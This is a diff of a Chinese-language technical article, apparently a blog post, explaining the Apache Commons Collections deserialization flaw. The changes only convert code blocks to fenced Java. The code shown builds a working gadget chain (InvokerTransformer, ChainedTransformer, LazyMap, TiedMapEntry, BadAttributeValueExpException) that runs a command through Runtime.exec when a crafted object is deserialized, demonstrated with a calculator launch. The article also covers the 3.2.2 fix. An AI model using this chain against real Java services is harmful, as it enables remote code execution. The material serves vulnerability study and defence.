@@ -38,9 +38,11 @@ Commons Collections中提供了一个Transformer接口，主要是可以用来�
 
 首先，通过InvokerTransformer的构造函数设置好我们要执行的方法以及参数：
 
-    Transformer transformer = new InvokerTransformer("exec",
-            new Class[] {String.class},
-            new Object[] {"open /Applications/Calculator.app"});
+```java
+Transformer transformer = new InvokerTransformer("exec",
+        new Class[] {String.class},
+        new Object[] {"open /Applications/Calculator.app"});
+```
     
 
 通过，构造函数，我们设定方法名为`exec`，执行的命令为`open /Applications/Calculator.app`，即打开mac电脑上面的计算器（windows下命令：`C:\\Windows\\System32\\calc.exe`）。
@@ -76,24 +78,26 @@ Commons Collections中提供了一个Transformer接口，主要是可以用来�
 
 那么，我们可以利用这个特性，来自己实现和`transformer.transform(Runtime.getRuntime());`同样的功能：
 
-     Transformer[] transformers = new Transformer[] {
-        //通过内置的ConstantTransformer来获取Runtime类
-        new ConstantTransformer(Runtime.class),
-        //反射调用getMethod方法，然后getMethod方法再反射调用getRuntime方法，返回Runtime.getRuntime()方法
-        new InvokerTransformer("getMethod",
-            new Class[] {String.class, Class[].class },
-            new Object[] {"getRuntime", new Class[0] }),
-        //反射调用invoke方法，然后反射执行Runtime.getRuntime()方法，返回Runtime实例化对象
-        new InvokerTransformer("invoke",
-            new Class[] {Object.class, Object[].class },
-            new Object[] {null, new Object[0] }),
-        //反射调用exec方法
-        new InvokerTransformer("exec",
-            new Class[] {String.class },
-            new Object[] {"open /Applications/Calculator.app"})
-    };
-    
-    Transformer transformerChain = new ChainedTransformer(transformers);
+```java
+ Transformer[] transformers = new Transformer[] {
+    //通过内置的ConstantTransformer来获取Runtime类
+    new ConstantTransformer(Runtime.class),
+    //反射调用getMethod方法，然后getMethod方法再反射调用getRuntime方法，返回Runtime.getRuntime()方法
+    new InvokerTransformer("getMethod",
+        new Class[] {String.class, Class[].class },
+        new Object[] {"getRuntime", new Class[0] }),
+    //反射调用invoke方法，然后反射执行Runtime.getRuntime()方法，返回Runtime实例化对象
+    new InvokerTransformer("invoke",
+        new Class[] {Object.class, Object[].class },
+        new Object[] {null, new Object[0] }),
+    //反射调用exec方法
+    new InvokerTransformer("exec",
+        new Class[] {String.class },
+        new Object[] {"open /Applications/Calculator.app"})
+};
+
+Transformer transformerChain = new ChainedTransformer(transformers);
+```
     
 
 在拿到一个transformerChain之后，直接调用他的transform方法，传入任何参数都可以，执行之后，也可以实现打开本地计算器程序的功能：
@@ -118,22 +122,26 @@ Commons Collections中提供了一个Transformer接口，主要是可以用来�
 
 顺藤摸瓜，可以找到Commons Collections中的TiedMapEntry类的getValue方法会调用到LazyMap的get方法，而TiedMapEntry类的getValue又会被其中的toString()方法调用到。
 
-    public String toString() {
-        return getKey() + "=" + getValue();
-    }
-    
-    public Object getValue() {
-        return map.get(key);
-    }
+```java
+public String toString() {
+    return getKey() + "=" + getValue();
+}
+
+public Object getValue() {
+    return map.get(key);
+}
+```
     
 
 那么，现在的攻击门槛就更低了一些，只要我们自己构造一个TiedMapEntry，并且将他进行序列化，这样，只要有人拿到这个序列化之后的对象，调用他的toString方法的时候，就会自动触发bug。
 
-    Transformer transformerChain = new ChainedTransformer(transformers);
-    
-    Map innerMap = new HashMap();
-    Map lazyMap = LazyMap.decorate(innerMap, transformerChain);
-    TiedMapEntry entry = new TiedMapEntry(lazyMap, "key");
+```java
+Transformer transformerChain = new ChainedTransformer(transformers);
+
+Map innerMap = new HashMap();
+Map lazyMap = LazyMap.decorate(innerMap, transformerChain);
+TiedMapEntry entry = new TiedMapEntry(lazyMap, "key");
+```
     
 
 我们知道，toString会在很多时候被隐式调用，如输出的时候(`System.out.println(ois.readObject());`)，代码示例如下：
@@ -162,18 +170,20 @@ BadAttributeValueExpException类是Java中提供的一个异常类，他的readO
 
 这就简单了，通过反射就能实现：
 
-    Transformer transformerChain = new ChainedTransformer(transformers);
-    
-    Map innerMap = new HashMap();
-    Map lazyMap = LazyMap.decorate(innerMap, transformerChain);
-    TiedMapEntry entry = new TiedMapEntry(lazyMap, "key");
-    
-    BadAttributeValueExpException poc = new BadAttributeValueExpException(null);
-    
-    // val是私有变量，所以利用下面方法进行赋值
-    Field valfield = poc.getClass().getDeclaredField("val");
-    valfield.setAccessible(true);
-    valfield.set(poc, entry);
+```java
+Transformer transformerChain = new ChainedTransformer(transformers);
+
+Map innerMap = new HashMap();
+Map lazyMap = LazyMap.decorate(innerMap, transformerChain);
+TiedMapEntry entry = new TiedMapEntry(lazyMap, "key");
+
+BadAttributeValueExpException poc = new BadAttributeValueExpException(null);
+
+// val是私有变量，所以利用下面方法进行赋值
+Field valfield = poc.getClass().getDeclaredField("val");
+valfield.setAccessible(true);
+valfield.set(poc, entry);
+```
     
 
 于是，这时候，攻击就非常简单了，只需要把BadAttributeValueExpException对象序列化成字符串，只要这个字符串内容被反序列化，那么就会被攻击。
@@ -214,9 +224,11 @@ BadAttributeValueExpException类是Java中提供的一个异常类，他的readO
 
 将Apache Commons Collections升级到3.2.2以后，执行文中示例代码，将报错如下：
 
-    Exception in thread "main" java.lang.UnsupportedOperationException: Serialization support for org.apache.commons.collections.functors.InvokerTransformer is disabled for security reasons. To enable it set system property 'org.apache.commons.collections.enableUnsafeSerialization' to 'true', but you must ensure that your application does not de-serialize objects from untrusted sources.
-        at org.apache.commons.collections.functors.FunctorUtils.checkUnsafeSerialization(FunctorUtils.java:183)
-        at org.apache.commons.collections.functors.InvokerTransformer.writeObject(InvokerTransformer.java:155)
+```java
+Exception in thread "main" java.lang.UnsupportedOperationException: Serialization support for org.apache.commons.collections.functors.InvokerTransformer is disabled for security reasons. To enable it set system property 'org.apache.commons.collections.enableUnsafeSerialization' to 'true', but you must ensure that your application does not de-serialize objects from untrusted sources.
+    at org.apache.commons.collections.functors.FunctorUtils.checkUnsafeSerialization(FunctorUtils.java:183)
+    at org.apache.commons.collections.functors.InvokerTransformer.writeObject(InvokerTransformer.java:155)
+```
     
 
 ### 后话
